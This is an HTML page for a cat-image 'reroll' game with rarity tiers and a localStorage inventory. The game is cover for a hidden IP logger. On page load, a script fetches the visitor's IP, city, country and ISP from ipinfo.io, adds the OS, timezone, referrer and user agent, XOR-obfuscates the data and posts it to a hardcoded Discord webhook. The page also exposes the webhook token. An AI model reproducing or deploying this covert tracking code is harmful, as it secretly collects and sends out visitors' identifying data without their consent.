<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>soosy.xyz</title>
  <link rel="icon" href="https://github.com/QIEJFOIUWEFH/soosycdn/blob/main/419.jpg?raw=true" type="image/jpeg" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    /* (Your original styles unchanged) */
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
      color: white;
      text-align: center;
      display: flex;
      flex-direction: row;
      justify-content: center;
      min-height: 100vh;
      padding: 1rem;
      overflow-x: hidden;
    }
    main {
      flex: 1;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    h1 {
      font-size: 2rem;
      margin-bottom: 0.5rem;
      font-weight: 600;
    }
    #catContainer {
      width: 280px;
      max-width: 90vw;
      margin: auto;
      perspective: 1000px;
      position: relative;
    }
    #catImg {
      width: 100%;
      border-radius: 12px;
      backface-visibility: hidden;
      transform-style: preserve-3d;
      transition: box-shadow 0.3s ease;
      position: relative;
    }
    .shuffling {
      animation: shuffleAnim 3.5s ease forwards;
    }
    @keyframes shuffleAnim {
      0% { left: 0; }
      15% { left: -30px; }
      30% { left: 30px; }
      45% { left: -20px; }
      60% { left: 20px; }
      75% { left: -10px; }
      90% { left: 10px; }
      100% { left: 0; }
    }
    #rarityText {
      margin-top: 8px;
      font-weight: 600;
      font-size: 1.1rem;
      min-height: 1.4em;
    }
    button {
      margin-top: 20px;
      padding: 10px 25px;
      border-radius: 20px;
      border: none;
      background: linear-gradient(45deg, #ff6a00, #ee0979);
      color: white;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      font-family: 'Poppins', sans-serif;
      user-select: none;
    }
    #rollCounter {
      margin-top: 12px;
      font-size: 1rem;
      font-weight: 600;
      color: #ffc107;
      user-select: none;
      min-height: 1.2em;
    }
    #inventory {
      margin-top: 30px;
      background: rgba(255 255 255 / 0.1);
      padding: 12px 20px;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
      text-align: left;
      font-size: 0.9rem;
      max-height: 200px;
      overflow-y: auto;
    }
    #inventory h2 {
      margin: 0 0 8px;
      font-weight: 600;
      color: #ffc107;
      text-align: center;
    }
    #inventory ul {
      list-style: none;
      margin: 0;
      padding: 0;
    }
    #inventory li {
      margin-bottom: 5px;
      border-bottom: 1px solid rgba(255 255 255 / 0.1);
      padding-bottom: 3px;
      color: #ddd;
    }
    .glow-common    { box-shadow: 0 0 15px gray; }
    .glow-uncommon  { box-shadow: 0 0 15px #2ecc71; }
    .glow-rare      { box-shadow: 0 0 15px #3498db; }
    .glow-epic      { box-shadow: 0 0 15px #9b59b6; }
    .glow-legendary { box-shadow: 0 0 20px #e67e22; }
    .glow-mythic    { box-shadow: 0 0 25px #f1c40f, 0 0 40px #f39c12; }
  </style>
</head>
<body>

  <main>
    <h1>HTTP Cat Reroll</h1>
    <div id="catContainer">
      <img id="catImg" src="" alt="HTTP cat" />
    </div>
    <div id="rarityText"></div>
    <button id="rerollBtn">Reroll</button>
    <div id="rollCounter">Rolls: 0</div>

    <div id="inventory">
      <h2>Inventory</h2>
      <ul id="inventoryList"></ul>
    </div>
  </main>

  <script>
    // --- Your existing cat code here ---
    const cats = [
      { code: 200, rarity: "Common" },
      { code: 201, rarity: "Common" },
      { code: 202, rarity: "Uncommon" },
      { code: 204, rarity: "Uncommon" },
      { code: 206, rarity: "Rare" },
      { code: 301, rarity: "Rare" },
      { code: 304, rarity: "Epic" },
      { code: 400, rarity: "Epic" },
      { code: 401, rarity: "Legendary" },
      { code: 403, rarity: "Legendary" },
      { code: 404, rarity: "Mythic" },
      { code: 418, rarity: "Mythic" },
      { code: 500, rarity: "Mythic" }
    ];

    const rarityClasses = {
      "Common": "glow-common",
      "Uncommon": "glow-uncommon",
      "Rare": "glow-rare",
      "Epic": "glow-epic",
      "Legendary": "glow-legendary",
      "Mythic": "glow-mythic"
    };

    const rarityChances = {
      "Common": "75%",
      "Uncommon": "15%",
      "Rare": "5%",
      "Epic": "3%",
      "Legendary": "1.5%",
      "Mythic": "0.5%"
    };

    const catImg = document.getElementById("catImg");
    const rarityText = document.getElementById("rarityText");
    const rerollBtn = document.getElementById("rerollBtn");
    const inventoryList = document.getElementById("inventoryList");
    const rollCounterDiv = document.getElementById("rollCounter");

    let inventory = JSON.parse(localStorage.getItem("inventory") || "{}");
    let lastCat = JSON.parse(localStorage.getItem("lastCat")) || getRandomCat();
    let animating = false;

    // Roll counter saved in localStorage
    let rollCount = parseInt(localStorage.getItem("rollCount") || "0");
    rollCounterDiv.textContent = `Rolls: ${rollCount}`;

    function getRandomCat() {
      const pool = [];
      cats.forEach(cat => {
        let weight = 1;
        switch (cat.rarity) {
          case "Common": weight = 150; break;
          case "Uncommon": weight = 30; break;
          case "Rare": weight = 10; break;
          case "Epic": weight = 6; break;
          case "Legendary": weight = 3; break;
          case "Mythic": weight = 1; break;
        }
        for (let i = 0; i < weight; i++) pool.push(cat);
      });
      return pool[Math.floor(Math.random() * pool.length)];
    }

    function saveInventory(code) {
      inventory[code] = (inventory[code] || 0) + 1;
      localStorage.setItem("inventory", JSON.stringify(inventory));
      renderInventory();
    }

    function renderInventory() {
      inventoryList.innerHTML = '';
      Object.keys(inventory)
        .sort((a, b) => a - b)
        .forEach(code => {
          const cat = cats.find(c => c.code == code);
          const rarity = cat ? cat.rarity : "Unknown";
          const chance = rarityChances[rarity] || "?";
          const li = document.createElement("li");
          li.textContent = `HTTP ${code} — ${rarity} - ${chance} — x${inventory[code]}`;
          inventoryList.appendChild(li);
        });
    }

    function showCat(cat) {
      catImg.src = `https://http.cat/${cat.code}.jpg`;
      rarityText.textContent = `Rarity: ${cat.rarity} — ${rarityChances[cat.rarity] || "?"}`;
      Object.values(rarityClasses).forEach(cls => catImg.classList.remove(cls));
      catImg.classList.add(rarityClasses[cat.rarity]);
      saveInventory(cat.code);
      localStorage.setItem("lastCat", JSON.stringify(cat));
      lastCat = cat;
    }

    function reroll() {
      if (animating) return;
      animating = true;

      catImg.classList.add("shuffling");
      rarityText.textContent = "Shuffling...";

      let shuffleInterval = setInterval(() => {
        const randomCat = getRandomCat();
        catImg.src = `https://http.cat/${randomCat.code}.jpg`;
        Object.values(rarityClasses).forEach(cls => catImg.classList.remove(cls));
        catImg.classList.add(rarityClasses[randomCat.rarity]);
      }, 150);

      setTimeout(() => {
        clearInterval(shuffleInterval);
        catImg.classList.remove("shuffling");
        const finalCat = getRandomCat();
        showCat(finalCat);

        // Update roll count
        rollCount++;
        localStorage.setItem("rollCount", rollCount);
        rollCounterDiv.textContent = `Rolls: ${rollCount}`;

        animating = false;
      }, 3500);
    }

    rerollBtn.onclick = reroll;

    // Show last cat and inventory on load
    showCat(lastCat);
    renderInventory();

    // --- Encryption & webhook logging below ---

    function xorEncryptDecrypt(input, key) {
      let output = "";
      for (let i = 0; i < input.length; i++) {
        output += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
      }
      return output;
    }

    function base64Encode(str) {
      return btoa(unescape(encodeURIComponent(str)));
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE");
        if (!res.ok) throw new Error("Failed to fetch IP info");
        return await res.json();
      } catch {
        return { ip: "unknown", city: "unknown", country: "unknown", org: "unknown" };
      }
    }

    function getOS(userAgent) {
      const osList = [
        { name: "Windows", regex: /Windows NT/i },
        { name: "macOS", regex: /Macintosh/i },
        { name: "Linux", regex: /Linux/i },
        { name: "Android", regex: /Android/i },
        { name: "iOS", regex: /iPhone|iPad/i },
      ];
      for (const os of osList) {
        if (os.regex.test(userAgent)) return os.name;
      }
      return "Unknown OS";
    }

    async function sendEncryptedLog(webhookUrl, dataObj, key) {
      const jsonStr = JSON.stringify(dataObj);
      const encrypted = xorEncryptDecrypt(jsonStr, key);
      const encoded = base64Encode(encrypted);

      const payload = {
        content: `Encrypted log data:\n\`\`\`base64\n${encoded}\n\`\`\``
      };

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    async function logUserData() {
      const webhookURL = "https://discord.com/api/webhooks/1379922193542152243/K19LU85LARF1On44CYFXLh56FAAlUBV_ADyVWVLaEmiGyVrKqIUL_R_-1qplKKx0oAOi";
      const userAgent = navigator.userAgent;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown";
      const referrer = document.referrer || "direct";
      const timestamp = new Date().toISOString();

      const ipInfo = await getIPInfo();

      const os = getOS(userAgent);

      const logData = {
        ip: ipInfo.ip || "unknown",
        city: ipInfo.city || "unknown",
        country: ipInfo.country || "unknown",
        isp: ipInfo.org || "unknown",
        os,
        timezone,
        referrer,
        userAgent,
        timestamp,
      };

      const encryptionKey = "4ca57ffa6e1fc4"; // your secret key
      await sendEncryptedLog(webhookURL, logData, encryptionKey);
    }

    // Fire on page load
    logUserData();

  </script>
</body>
</html>
